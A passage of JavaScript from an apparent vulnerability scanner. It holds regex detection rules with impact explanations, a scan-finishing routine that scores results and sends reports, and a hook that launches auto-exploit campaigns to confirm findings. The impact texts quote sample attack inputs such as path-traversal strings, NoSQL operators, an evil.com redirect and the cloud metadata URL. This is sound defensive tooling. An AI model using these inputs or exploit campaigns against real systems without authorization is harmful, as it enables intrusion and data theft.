      { re: /document\.write\s*\(/, sev: 'low', cwe: 'CWE-79', title: 'document.write — DOM XSS risk', owasp: 'A05:2025-Injection', impact: 'document.write() can inject HTML/JavaScript into the page. If fed untrusted data, attackers can hijack user sessions, deface the page, or redirect victims to malicious sites.', ext: ALL },
      { re: /v-html\s*=/i, sev: 'medium', cwe: 'CWE-79', title: 'Vue v-html directive — XSS risk', owasp: 'A05:2025-Injection', impact: 'Vue\'s v-html renders raw HTML. If the bound data comes from user input, attackers can inject malicious scripts that execute in every visitor\'s browser.', ext: ALL },
      { re: /\{\{\{.*\}\}\}/, sev: 'medium', cwe: 'CWE-79', title: 'Handlebars triple-brace (unescaped HTML) — XSS risk', owasp: 'A05:2025-Injection', impact: 'Triple braces {{{ }}} in Handlebars render unescaped HTML. If the variable contains user input, attackers can inject <script> tags that steal cookies and hijack user sessions.', ext: ALL },
      { re: /res\.(?:send|write|end)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-79', title: 'Reflected XSS — response body from user input', owasp: 'A05:2025-Injection', impact: 'The server sends user input directly back in the HTTP response without sanitization. An attacker can craft a malicious link that, when clicked, executes JavaScript in the victim\'s browser — stealing their session and impersonating them.', ext: ALL },
      // SSTI patterns
      { re: /render\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'high', cwe: 'CWE-1336', title: 'Server-Side Template Injection (SSTI) risk', owasp: 'A05:2025-Injection', impact: 'User input is passed to a template engine\'s render function. Attackers can inject template syntax (e.g., {{7*7}} in Jinja2, <%= %> in EJS) to execute arbitrary code on the server, read files, and gain full remote code execution.', ext: ALL },
      { re: /\.render\s*\(\s*template\s*\+\s*/i, sev: 'high', cwe: 'CWE-1336', title: 'Template path concatenated with user input', owasp: 'A05:2025-Injection', impact: 'The template file path is built from user input. Attackers can traverse directories to render arbitrary files or inject template syntax for server-side code execution.', ext: ALL },
      // NoSQL Injection
      { re: /\.find\s*\(\s*\{[^}]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-943', title: 'NoSQL injection — MongoDB query from user input', owasp: 'A05:2025-Injection', impact: 'MongoDB queries are built from raw user input. Attackers can inject operators like {$gt: ""} or {$ne: null} to bypass authentication, extract all documents, or cause denial of service.', ext: ALL },
      { re: /\.aggregate\s*\(\s*\[[^\]]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-943', title: 'NoSQL injection in aggregation pipeline', owasp: 'A05:2025-Injection', impact: 'The MongoDB aggregation pipeline includes user input. Attackers can manipulate the pipeline to bypass access controls and extract data they should not see.', ext: ALL },
      // LDAP Injection
      { re: /ldap\.(?:search|query|filter)\s*\([^)]*req\.(?:body|query|params)/, sev: 'high', cwe: 'CWE-90', title: 'LDAP injection — user input in LDAP filter', owasp: 'A05:2025-Injection', impact: 'User input is placed directly in an LDAP query filter. Attackers can inject LDAP metacharacters (*, |, &) to bypass authentication, list all users, or extract sensitive directory information.', ext: ALL },

      // ── A01:2025 — Broken Access Control (IDOR, path traversal, missing authz) ──
      { re: /(?:readFile|readFileSync|createReadStream|fs\.read|file_get_contents|open\s*\([^)]*\.\.\/)/, sev: 'high', cwe: 'CWE-22', title: 'Path traversal — file read with user input', owasp: 'A01:2025-Broken Access Control', impact: 'An attacker can read arbitrary files from the server by manipulating file paths (e.g., ../../../etc/passwd). This can expose source code, configuration files with database passwords, SSH keys, and system files containing user data.', ext: ALL },
      // Path traversal: only flag ../ outside of import/require statements (skip TS relative imports)
      { re: /(?:\.\.\/|\.\.\\)/, sev: 'info', cwe: 'CWE-22', title: 'Path traversal sequence in source', owasp: 'A01:2025-Broken Access Control', impact: 'The code contains path traversal sequences. If this path is influenced by user input, attackers can escape the intended directory and read any file on the server.', ext: f => extMatch(f, ['.php', '.py', '.rb', '.java', '.go', '.c', '.cpp', '.sh', '.bat', '.yaml', '.yml', '.env', '.config', '.conf', '.ini', '.toml', '.xml', '.json']) },
      // IDOR: a route with a path parameter is only *risky* when no
      // authorization middleware (or inline auth check) is present on the route.
      // Previously every `/users/:id` route was flagged even when guarded by
      // requireAuth, producing a flood of false positives on Express codebases.
      { re: /(?:app|router)\.(?:get|post|put|delete|patch)\s*\(\s*['"`]\/[^'"`]*\/:(\w+)[^'"`]*['"`]\s*,(?!\s*(?:[A-Za-z_$][\w$]*[A-Za-z0-9_$]*\s*,\s*)*?(?:requireAuth|ensureAuth|isAuthenticated|isLoggedIn|authenticate|authorize|checkAuth|verifyToken|verifyJwt|requirePermission|requireRole|requireAdmin|authMiddleware|authenticated|protect|withAuth|guard)\b)/, sev: 'low', cwe: 'CWE-639', title: 'IDOR risk — route parameter without authorization check', owasp: 'A01:2025-Broken Access Control', impact: 'The route accepts a resource ID from the URL (e.g., /users/:id) without visible authorization checks. An attacker can change the ID to access other users\' data, private documents, or restricted resources.', ext: ALL },
      { re: /(?:findById|findOne|findByPk|get\s*\(\s*['"]\/\w+\/\w+['"])\s*\([^)]*req\.params/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — database lookup by URL param without ownership check', owasp: 'A01:2025-Broken Access Control', impact: 'The application fetches a database record based on a URL parameter without verifying the current user owns that record. An attacker can enumerate IDs to access every user\'s private data.', ext: ALL },
      { re: /(?:req\.params\.id|req\.query\.id|req\.body\.id)\s*&&\s*!(?:req\.user|req\.session|auth)/, sev: 'medium', cwe: 'CWE-639', title: 'IDOR — uses request ID without authentication guard', owasp: 'A01:2025-Broken Access Control', impact: 'The application uses a user-supplied ID without first checking authentication or authorization. An unauthenticated attacker can access any record by guessing or enumerating IDs.', ext: ALL },
      { re: /\.(?:role|isAdmin|isManager|isSuperUser)\s*===\s*['"]admin['"]/, sev: 'low', cwe: 'CWE-285', title: 'Hardcoded role check — may be bypassable', owasp: 'A01:2025-Broken Access Control', impact: 'Authorization is checked by comparing a role string. If the role can be manipulated (e.g., via JWT tampering or request modification), attackers can set their role to "admin" and gain full access.', ext: ALL },
      { re: /res\.redirect\s*\(\s*(?:req\.(?:query|params|body)\.)/, sev: 'medium', cwe: 'CWE-601', title: 'Open redirect — user-controlled redirect target', owasp: 'A01:2025-Broken Access Control', impact: 'The application redirects users to a URL from user input. Attackers can craft phishing links (e.g., /login?redirect=http://evil.com) that appear to come from your domain, tricking users into entering credentials on a fake login page.', ext: ALL },

      // ── A04:2025 — Cryptographic Failures ──
      { re: /md5|sha1(?!256|512)/i, sev: 'low', cwe: 'CWE-327', title: 'Weak hash algorithm (MD5/SHA1)', owasp: 'A04:2025-Cryptographic Failures', impact: 'MD5 and SHA1 are cryptographically broken — attackers can generate collisions (two different inputs that produce the same hash) in seconds. Anyone with access to the hashed data can crack it with freely available tools.', ext: ALL },
      { re: /createHash\s*\(\s*['"]md5['"]\s*\)/, sev: 'medium', cwe: 'CWE-327', title: 'MD5 used for hashing', owasp: 'A04:2025-Cryptographic Failures', impact: 'MD5 is explicitly used for hashing. MD5 collisions can be generated in under a second on modern hardware. Any password hashed with MD5 is effectively unprotected.', ext: ALL },
      { re: /Math\.random\s*\(\s*\)/, sev: 'low', cwe: 'CWE-338', title: 'Math.random() — not cryptographically secure', owasp: 'A04:2025-Cryptographic Failures', impact: 'Math.random() is predictable and should never be used for security purposes (tokens, passwords, session IDs). Attackers can predict the "random" values and hijack sessions or reset tokens.', ext: ALL },
      { re: /jwt\.(?:verify|decode)\s*\([^)]*algorithms?\s*:\s*\[[^\]]*none/i, sev: 'critical', cwe: 'CWE-347', title: 'JWT "none" algorithm accepted', owasp: 'A04:2025-Cryptographic Failures', impact: 'The JWT library accepts tokens signed with the "none" algorithm (no signature). An attacker can forge a token with any user ID and role — including admin — and the server will accept it as valid. This is a complete authentication bypass.', ext: ALL },
      // Cleartext HTTP: only a literal http:// URL (or an explicit fetch/axios
      // target on http:) is evidence of unencrypted transport. A bare `http`
      // word used to match `require('http')`, `http-equiv`, `httpOnly`, and
      // `HttpClient` — none of which are transport security issues.
      { re: /['"`]http:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])/i, sev: 'low', cwe: 'CWE-319', title: 'HTTP (cleartext) URL hardcoded', owasp: 'A04:2025-Cryptographic Failures', impact: 'A plain http:// endpoint is hardcoded. Traffic to it — including credentials, session tokens, and personal data — travels in plain text and can be read by anyone on the same network.', ext: ALL },
      { re: /(?:crypto\.createCipher|crypto\.createCipheriv)\s*\(\s*['"](?:des|rc4|bf|blowfish)/, sev: 'high', cwe: 'CWE-327', title: 'Broken cipher (DES/RC4/Blowfish) used for encryption', owasp: 'A04:2025-Cryptographic Failures', impact: 'DES and RC4 are trivially breakable — DES keys can be brute-forced in hours. Any data encrypted with these ciphers should be considered compromised. An attacker who intercepts the encrypted data can decrypt it.', ext: ALL },

      // ── A06:2025 — Insecure Design ──
      { re: /(?:rate.limit|throttle|maxAttempts|max_attempts)/i, sev: 'info', cwe: 'CWE-307', title: 'Rate limiting may be insufficient', owasp: 'A06:2025-Insecure Design', impact: 'Without proper rate limiting, attackers can brute-force passwords, API keys, or 2FA codes by trying thousands of combinations per second. An account with a weak password can be compromised in minutes.', ext: ALL },
      { re: /(?:password|passwd|pwd)\s*=\s*['"][^'"]{1,5}['"]/, sev: 'medium', cwe: 'CWE-521', title: 'Weak/default password in source code', owasp: 'A06:2025-Insecure Design', impact: 'A very short or default password is hardcoded. Attackers can guess it in seconds. If this is a production credential, the system is effectively unprotected.', ext: ALL },
      { re: /(?:password|passwd)\s*[:=]\s*['"](?:admin|password|123456|test|guest|qwerty)/i, sev: 'high', cwe: 'CWE-521', title: 'Known default password in source', owasp: 'A06:2025-Insecure Design', impact: 'A well-known default password (admin, password, 123456) is in the source code. These are the first passwords any attacker tries. If deployed, the application is immediately compromised.', ext: ALL },

      // ── A02:2025 — Security Misconfiguration (CORS, debug, XXE, file upload) ──
      { re: /cors\s*\(\s*\{?\s*origin\s*:\s*(?:true|['"]\*['"])/i, sev: 'medium', cwe: 'CWE-942', title: 'Permissive CORS (origin: *)', owasp: 'A02:2025-Security Misconfiguration', impact: 'CORS is configured to allow ANY website to make requests to your API. While credentials are not sent, any public data can be read by malicious sites. Combined with other vulnerabilities, this can enable cross-origin attacks.', ext: ALL },
      { re: /Access-Control-Allow-Origin['"]?\s*[:,]\s*['"]\*['"]/, sev: 'medium', cwe: 'CWE-942', title: 'Wildcard CORS header', owasp: 'A02:2025-Security Misconfiguration', impact: 'The server explicitly allows any origin. Malicious websites can read API responses in the victim\'s browser context, potentially leaking sensitive data.', ext: ALL },
      { re: /app\.use\s*\(\s*['"]\/(?:debug|test|dev)/i, sev: 'low', cwe: 'CWE-489', title: 'Debug/test route mounted', owasp: 'A02:2025-Security Misconfiguration', impact: 'Debug or test routes are exposed in production. These often bypass authentication, leak internal state, or expose sensitive configuration. Attackers can use these to understand the application internals.', ext: ALL },
      { re: /(?:debug|DEBUG)\s*=\s*(?:true|1|['"]on['"])/i, sev: 'medium', cwe: 'CWE-489', title: 'Debug mode enabled in production', owasp: 'A02:2025-Security Misconfiguration', impact: 'Debug mode is ON. Error pages will show full stack traces with file paths, database queries, and environment details. This is a goldmine for attackers — it reveals the exact technology stack, internal paths, and sometimes credentials.', ext: ALL },
      // XXE patterns (Java/PHP only)
      { re: /xml\.(?:parse|Parse|load|Load|DOM)/, sev: 'medium', cwe: 'CWE-611', title: 'XML parsing without XXE protection', owasp: 'A02:2025-Security Misconfiguration', impact: 'XML is parsed without disabling external entities. Attackers can send a crafted XML document that reads local files (/etc/passwd), performs SSRF to internal services, or causes denial of service (Billion Laughs attack).', ext: f => extMatch(f, ['.java', '.php', '.py', '.rb']) },
      { re: /(?:DocumentBuilder|SAXParser|XMLInputFactory|SAXReader|XMLReader)\s*\.\s*new/, sev: 'medium', cwe: 'CWE-611', title: 'Java XML parser — potential XXE', owasp: 'A02:2025-Security Misconfiguration', impact: 'Java XML parsers are vulnerable to XXE by default. Attackers can read arbitrary files from the server, perform SSRF, or cause denial of service through crafted XML input.', ext: f => extMatch(f, ['.java']) },
      { re: /(?:libxml|simplexml_load_string|DOMDocument)\s*\(/, sev: 'medium', cwe: 'CWE-611', title: 'PHP XML parsing — potential XXE', owasp: 'A02:2025-Security Misconfiguration', impact: 'PHP\'s XML functions load external entities by default. Attackers can read /etc/passwd, access internal services, or cause DoS through XML entity expansion.', ext: f => extMatch(f, ['.php']) },
      // File upload patterns
      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\(/, sev: 'medium', cwe: 'CWE-434', title: 'File upload without visible validation', owasp: 'A02:2025-Security Misconfiguration', impact: 'File upload functionality exists without visible file type or content validation. An attacker can upload a malicious script (e.g., shell.php, malware.exe) and execute it on the server. This can lead to complete server takeover.', ext: ALL },
      { re: /(?:multer|upload|file_put_contents|move_uploaded_file|saveUploadedFile)\s*\([^)]*req\.(?:file|files)/, sev: 'high', cwe: 'CWE-434', title: 'Unrestricted file upload — user file saved directly', owasp: 'A02:2025-Security Misconfiguration', impact: 'User-uploaded files are saved to the server without checking the file type, content, or extension. Attackers can upload a web shell (e.g., .php, .jsp, .aspx) and execute arbitrary commands on the server through a browser — this is remote code execution.', ext: ALL },
      { re: /(?:\.png|\.jpg|\.jpeg|\.gif|\.svg|\.bmp|\.webp|\.ico)/i, sev: 'info', cwe: 'CWE-434', title: 'Image upload/handling — check for SVG XSS and ImageTragick', owasp: 'A02:2025-Security Misconfiguration', impact: 'Image uploads can be dangerous. SVG files can contain embedded JavaScript (XSS). Image processing libraries like ImageMagick have had critical RCE vulnerabilities (ImageTragick). Ensure uploaded files are re-encoded, not just validated by extension.', ext: ALL },
      { re: /(?:\.exe|\.dll|\.so|\.sh|\.bat|\.cmd|\.ps1|\.vbs|\.jar|\.war|\.php|\.jsp|\.asp|\.aspx|\.py|\.pl|\.rb|\.cgi)/i, sev: 'high', cwe: 'CWE-434', title: 'Potentially executable file extension in upload logic', owasp: 'A02:2025-Security Misconfiguration', impact: 'The code references executable file extensions (.exe, .php, .jsp, etc.) in upload logic. If these extensions are allowed, attackers can upload and execute arbitrary code on the server. Only allow strictly necessary file types (e.g., .pdf, .png after re-encoding).', ext: ALL },

      // ── A03:2025 — Software Supply Chain Failures ──
      { re: /"(?:express|koa|hapi|fastify|next|nuxt|react|angular|vue|jquery|bootstrap|spring|django|flask|rails|laravel|symfony|wordpress|drupal|joomla|struts|tomcat|nginx|apache)":\s*"[~^]?\d+\.\d+\.\d+/i, sev: 'info', cwe: 'CWE-1104', title: 'Dependency version in package.json/composer.json', owasp: 'A03:2025-Software Supply Chain Failures', impact: 'The dependency version is pinned. If this version is outdated, it may contain known vulnerabilities with public exploits. Attackers can use automated scanners to find and exploit these known weaknesses.', ext: ALL },

      // ── A07:2025 — Authentication Failures ──
      { re: /(?:session|token|jwt).?(?:secret|key)\s*[:=]\s*['"][^'"]{1,20}['"]/i, sev: 'high', cwe: 'CWE-798', title: 'Weak session/JWT secret key', owasp: 'A07:2025-Authentication Failures', impact: 'The session signing secret is too short or hardcoded. Attackers can brute-force it to forge valid session tokens for any user, including administrators. This bypasses the entire authentication system.', ext: ALL },
      { re: /(?:login|signin|authenticate|auth)\s*\([^)]*\)\s*{?\s*[^}]{0,100}?\btrue\b/, sev: 'medium', cwe: 'CWE-287', title: 'Authentication returning true without visible validation', owasp: 'A07:2025-Authentication Failures', impact: 'The login function appears to return success without proper credential validation. This could mean the authentication is bypassable or the validation is missing entirely.', ext: ALL },

      // ── A08:2025 — Software or Data Integrity Failures ──
      { re: /pickle\.loads?|yaml\.load\s*\((?![^)]*Loader)/, sev: 'high', cwe: 'CWE-502', title: 'Unsafe deserialization (pickle/yaml.load)', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'pickle.loads() and yaml.load() (without SafeLoader) can execute arbitrary code during deserialization. An attacker who can supply a crafted serialized object can achieve remote code execution on the server — this is as dangerous as SQL injection.', ext: f => extMatch(f, ['.py']) },
      { re: /unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)/, sev: 'high', cwe: 'CWE-502', title: 'PHP unserialize() on user input', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'PHP unserialize() on user-controlled data allows attackers to inject serialized PHP objects. With the right "gadget chain" (available in common frameworks), this leads to arbitrary code execution — full server compromise.', ext: f => extMatch(f, ['.php']) },
      { re: /JSON\.parse\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)/, sev: 'info', cwe: 'CWE-502', title: 'JSON.parse on user input — verify no prototype pollution', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'JSON.parse is generally safe from deserialization attacks, but the resulting object should not be merged into prototypes. Check for Object.assign() or spread operators that could enable prototype pollution leading to denial of service or privilege escalation.', ext: ALL },
      { re: /(?:\.extend|Object\.assign|merge|_.merge|\.defaultsDeep)\s*\([^)]*req\.(?:body|query|params)/, sev: 'medium', cwe: 'CWE-1321', title: 'Prototype pollution — user input merged into objects', owasp: 'A08:2025-Software or Data Integrity Failures', impact: 'User input is merged into application objects. Attackers can inject __proto__ or constructor.prototype properties to pollute the global object prototype, affecting all objects in the application. This can lead to property injection, authentication bypass, or remote code execution.', ext: ALL },

      // ── A09:2025 — Security Logging and Alerting Failures ──
      { re: /console\.(?:log|error|warn|info|debug)\s*\([^)]*(?:password|secret|token|key|credential|api[_-]?key)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data logged to console', owasp: 'A09:2025-Security Logging and Alerting Failures', impact: 'Passwords, tokens, or secrets are being written to console logs. Production logs are often stored in files, aggregated to logging services, or visible in container/cloud logs — anyone with log access can see these credentials.', ext: ALL },
      { re: /(?:logger|log)\.(?:info|debug|error|warn)\s*\([^)]*(?:password|secret|token|key|credential)/i, sev: 'medium', cwe: 'CWE-532', title: 'Sensitive data written to application logs', owasp: 'A09:2025-Security Logging and Alerting Failures', impact: 'Credentials or secrets are being written to application logs. Logs are often accessible to developers, stored in plaintext, and may be shipped to third-party services — exposing credentials to anyone with log access.', ext: ALL },

      // ── A05:2025 — Injection (SSRF) ──
      { re: /fetch\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The server makes HTTP requests to URLs provided by the user. Attackers can make the server request internal services (e.g., http://169.254.169.254/latest/meta-data/ on AWS to steal cloud credentials), scan internal networks, or attack internal APIs.', ext: ALL },
      { re: /axios\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — outbound request with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The server makes outbound HTTP requests to user-supplied URLs. Attackers can access internal cloud metadata services (AWS/GCP/Azure), hit internal admin panels, or scan the internal network behind the firewall.', ext: ALL },
      { re: /(?:urllib|requests|httpx|http\.client|got|superagent|needle|node-fetch)\s*\.\s*(?:get|post|put|delete|request)\s*\(\s*(?:req\.|params\.|query\.|body\.)/, sev: 'medium', cwe: 'CWE-918', title: 'SSRF — HTTP client with user-controlled URL', owasp: 'A05:2025-Injection', impact: 'The application makes HTTP requests to URLs from user input. Attackers can access internal services, cloud metadata endpoints, or attack internal infrastructure that is not exposed to the internet.', ext: ALL },
      { re: /(?:import\s+urllib|from\s+urllib|import\s+requests|require\s*\(\s*['"]https?['"]\s*\)|require\s*\(\s*['"]axios['"]\s*\))/, sev: 'info', cwe: 'CWE-918', title: 'HTTP client library imported — check for SSRF', owasp: 'A05:2025-Injection', impact: 'An HTTP client library is imported. If any URL passed to it comes from user input without validation, attackers can make the server request internal services, steal cloud credentials, or attack internal infrastructure.', ext: ALL },
    ]
    const findings = []
    for (const f of files) {
      const content = String(f.content || '')
      const lines = content.split('\n')
      const seen = new Set()
      for (let i = 0; i < lines.length && findings.length < 500; i++) {
        const line = lines[i]
        if (!line || line.trim().startsWith('//') && !/[:=]/.test(line)) continue
        for (const r of RULES) {
          if (!r.re.test(line)) continue
          // Skip if rule doesn't apply to this file extension
          if (r.ext && !r.ext(f)) continue
          const key = `${f.path}:${r.title}`
          if (seen.has(key)) continue
          seen.add(key)
          const impact = r.impact || IMPACT[r.owasp] || 'This vulnerability could allow attackers to compromise the application or its data.'
          findings.push({
            title: `${r.title} — ${f.path}:${i + 1}`,
            severity: r.sev,
            cweId: r.cwe,
            owaspCategory: r.owasp,
            description: `${r.title} detected at ${f.path}:${i + 1}. Matched line: \`${line.trim().slice(0, 160)}\``,
            laymanImpact: impact,
            remediation: 'Review the flagged line: remove hardcoded secrets (use env vars/secret manager), sanitize user input before dangerous sinks, and replace weak crypto.',
            module: 'pattern-scan',
            evidence: { file: f.path, line: i + 1, code: line.trim().slice(0, 300) },
          })
          break // one rule per line is enough
        }
      }
    }
    return findings
  }

  /** Compute final risk score + persist status. */
  finish(scanId, status, scan = null) {
    const findings = db.all(`SELECT severity, cvss FROM findings WHERE scan_id = ?`, scanId)
    const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
    for (const f of findings) counts[f.severity] = (counts[f.severity] || 0) + 1
    let maxCvss = 0
    for (const f of findings) {
      if (f.cvss != null && f.cvss > maxCvss) maxCvss = Number(f.cvss)
    }
    const score = computeRiskScore(counts, maxCvss)
    // Persist what the AI pass actually cost. A scan that fell back to the
    // evidence heuristics leaves calls=0 here, which is the only honest way to
    // tell "the model looked at this and disagreed" apart from "no model ran".
    const usage = aiEngine.llm.getUsageTotals()
    try {
      db.run(`UPDATE scans SET token_usage = ? WHERE id = ?`, JSON.stringify(usage), scanId)
      this.log(scanId, 'info',
        `🤖 [AI] model usage: ${usage.calls} call(s), ${usage.total_tokens} token(s)` +
        (usage.calls === 0 ? ' — no model was reached; every verdict came from evidence heuristics' : ''))
    } catch { /* non-critical */ }
    const scanRow = scan || db.get(`SELECT * FROM scans WHERE id = ?`, scanId)
    // Hybrid/whitebox-folder runs stage whitebox then blackbox on one scanId.
    // The intermediate finish() must not publish a terminal state: its finding
    // set is partial, so the UI would flip the row to completed/100% (and the
    // email/alert would carry no blackbox results) before blackbox resets the
    // progress back to 2%. The caller releases the deferral before the final
    // finish(), which then persists and notifies exactly once.
    // A failed first phase keeps its deferral set (the caller aborts before
    // releasing it), so only defer on 'completed' — otherwise a crashed hybrid
    // scan would stay 'running' in the DB forever.
    const deferred = status === 'completed' && this._deferredFinish.has(scanId)
    if (deferred) {
      this.log(scanId, 'info', '⏸ Intermediate phase finished — holding terminal status until the remaining phase completes')
    } else {
      db.run(`UPDATE scans SET status = ?, risk_score = ?, progress = 100, finished_at = ? WHERE id = ?`,
        status, score, new Date().toISOString(), scanId)
      this.progress(scanId, 100, status)
      // `coverage` travels with the terminal event so a caller can warn about an
      // untested vulnerability class before the PDF is ever generated. Read from
      // live state first (runBlackbox set it), falling back to the persisted blob
      // for the retry paths that never call runBlackbox.
      const coverage = this._coverage?.get(scanId) || coverageFromMeta(scanRow?.blackbox_meta)
      this.emit(scanId, 'scan:done', { scanId, status, scan: scanRow, counts, riskScore: score, coverage })
    }
    // Release per-scan runtime state so Maps don't grow unbounded.
    // releaseScanState covers _loginForms/_blackboxMeta too, which finish()
    // previously never removed.
    this.releaseScanState(scanId)
    this._markFinished(scanId)
    if (deferred) return

    // ── TELEGRAM & DISCORD REAL-TIME SCAN NOTIFICATION ──
    if (status === 'completed') {
      import('./channels/index.js').then(({ channelGateway }) => {
        channelGateway.notifyScanCompleted(scanRow, counts, score).catch(() => {})
      }).catch(() => {})
    }

    // ── AUTOMATED PDF REPORT & EMAIL DISPATCH ──
    if (status === 'completed' && (scanRow?.email_notify || scanRow?.trigger_source?.startsWith('github'))) {
      setImmediate(async () => {
        try {
          const { generateReport } = await import('./report.js')
          const { sendScanAuditReportEmail } = await import('./email.js')
          const scanFindings = db.all(`SELECT * FROM findings WHERE scan_id = ? ORDER BY CASE severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END`, scanId)
          
          this.log(scanId, 'info', `📄 Auto-generating PDF audit report for email notification...`)
          const repResult = await generateReport(scanId, 'info', 'all', { reportType: 'full' })
          const path = (await import('node:path')).default
          const { config } = await import('./config.js')
          const pdfPath = repResult?.file || path.join(config.outputDir, `report-${scanId}.pdf`)
          
          const userEmail = scanRow.email_notify || process.env.NOTIFICATION_EMAIL || 'muhammadsaifudinmj@gmail.com'
          this.log(scanId, 'info', `📧 Dispatching audit report email to ${userEmail}...`)
          
          await sendScanAuditReportEmail({
            userEmail,
            scan: scanRow,
            findings: scanFindings,
            pdfPath,
            pdfFilename: repResult?.filename,
            repoName: scanRow.repo_name || scanRow.target,
            triggerSource: scanRow.trigger_source || 'automation',
            commitHash: scanRow.commit_hash,
          })
          this.log(scanId, 'info', `✅ Audit report email successfully delivered to ${userEmail}`)
        } catch (err) {
          this.log(scanId, 'warn', `⚠️ Auto email dispatch notice: ${err.message}`)
        }
      })
    }
  }

  /**
   * Auto-exploit hook: launch a campaign to actively confirm a claimed finding.
   *
   * Returns the campaign result so callers can await confirmation, and promotes
   * the finding in place when a campaign captures a real artifact. Promotion is
   * deliberately conservative: we re-run the same evidence contract rather than
   * trusting the campaign's own success flag, so a campaign that claims success
   * without producing an artifact cannot self-certify.
   */
  async _autoExploit(scanId, finding) {
    try {
      const scan = db.get(`SELECT * FROM scans WHERE id = ?`, scanId)
      if (!scan) return null
      // Use the singleton ExploitOrchestrator from index.js (passed via pipeline constructor)
      const { ExploitOrchestrator } = await import('./exploits/orchestrator.js')
      const engine = this._exploitEngine || new ExploitOrchestrator({ io: this.io, pipeline: this })
      const result = await engine.launchCampaign(scan, finding)
      if (result?.campaignId) {
        this.log(scanId, 'info', `⚔️ Auto-exploit campaign launched: ${result.campaignId} (risk: ${result.risk || '?'})`)
        result.promoted = false
        result.capture = null

        // ── Harvest the campaign artifact back into the finding ──
        // Without this the campaign is a side-show: it proves exploitability in
        // its own tables while the finding that prompted it stays "unverified"
        // forever, which is the observable failure this hook exists to fix.
        const capture = this._harvestCampaignCapture(result.campaignId, scanId)
        if (capture) {
          // finding.evidence arrives as a JSON STRING when it came straight from
          // db.get(); spreading a string yields {0:'{',1:'"',...} and that
          // corruption was then written back by _promoteFromCapture. Parse
          // defensively so both callers (string or object) are safe.
          let base = finding.evidence
          if (typeof base === 'string') {
            try { base = JSON.parse(base) } catch { base = {} }
          }
          const evidence = { ...(base && typeof base === 'object' ? base : {}), ...capture }
          const promoted = this._promoteFromCapture(scanId, finding.id, evidence)
          result.capture = capture
          result.promoted = promoted
        }
      }
      return result
    } catch (e) {
      this.log(scanId, 'warn', `Auto-exploit launch failed: ${e.message}`)
      return null
    }
  }

  /**
   * Pull the strongest captured artifact out of a campaign's completed steps.
   * Returns an evidence patch, or null when the campaign produced no real capture
   * (queued / awaiting approval / failed / all steps inconclusive).
   */
  _harvestCampaignCapture(campaignId, scanId = null) {
    let steps = []
    try {
      // Column names are taken from the live schema (PRAGMA table_info):
      // exploit_steps has id / campaign_id / step_order / step_type / tool_name /
      // command / payload / status / needs_approval / output / session_ref /
      // started_at / finished_at / created_at. There is no step_id, technique,
      // evidence or exit_code column — querying those threw, and the catch below
      // turned the failure into a silent "no capture", so a campaign could not
      // report its own artifacts.
      steps = db.all(
        `SELECT id, step_order, step_type, tool_name, command, status, output
           FROM exploit_steps WHERE campaign_id = ? ORDER BY step_order, rowid`,
        campaignId
      ) || []
    } catch (e) {
      this.log(scanId, 'warn', `Capture harvest query failed for campaign ${campaignId}: ${e.message}`)
      return null
    }
    const succeeded = steps.filter(s => s.status === 'success')
    if (!succeeded.length) return null

    for (const step of succeeded) {
      const technique = step.step_type || step.tool_name || step.id
      const out = String(step.output || '').trim()
      if (!out) continue

      // A step's output is often a tool's own JSON envelope; unwrap it so the
      // capture lands as a structured artifact the report can render, and fall
      // back to the raw text when it is not JSON.
      let parsed = null
      if (out.startsWith('{') || out.startsWith('[')) {
        try { parsed = JSON.parse(out) } catch { parsed = null }
      }
      const base = {
        exploitedBy: technique,
        campaignId,
        stepId: step.id,
        command: step.command ? String(step.command).slice(0, 2000) : undefined,
        evidenceTier: 'exploited',
        verification: 'exploited',
      }
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed) && Object.keys(parsed).length) {
        return { ...parsed, ...base }
      }
      if (Array.isArray(parsed) && parsed.length) {
        return { ...base, output: JSON.stringify(parsed).slice(0, 4000) }
      }
      if (out.length > 40) {
        return { ...base, output: out.slice(0, 4000) }
      }
    }
    return null
  }

  /**
   * Promote a finding to confirmed once a campaign has captured an artifact.
   * Re-uses the single evidence contract so promotion and initial classification
   * can never disagree about what counts as proof.
   */
  _promoteFromCapture(scanId, findingId, evidence) {
    try {
      const row = db.get(`SELECT * FROM findings WHERE id = ?`, findingId)
      if (!row) return false
      let prior = {}
      try { prior = JSON.parse(row.evidence || '{}') } catch { prior = {} }
      const merged = { ...prior, ...evidence }

      const verdict = {
        agent: 'exploit-campaign',
        confidence: 95,
        verdict: `Active confirmation succeeded via ${evidence.exploitedBy || 'campaign step'}; artifact captured and retained.`,
        isTruePositive: true,
        evidenceTier: 'exploited',
      }
      db.run(
        `UPDATE findings SET evidence = ?, agent_verdict = ? WHERE id = ?`,
        JSON.stringify(merged),
        JSON.stringify({
          agent: verdict.agent,
          confidence: verdict.confidence,
          reasoning: verdict.verdict,
          is_true_positive: true,
          evidence_tier: 'exploited',
        }),
        findingId
      )
      this.log(scanId, 'success',
        `✅ Actively confirmed: "${row.title}" — artifact from ${evidence.exploitedBy || 'campaign'} retained (tier: exploited)`)
      const updated = db.get(`SELECT * FROM findings WHERE id = ?`, findingId)
      this.emit(scanId, 'scan:finding', { scanId, finding: updated })
      return true
    } catch (e) {
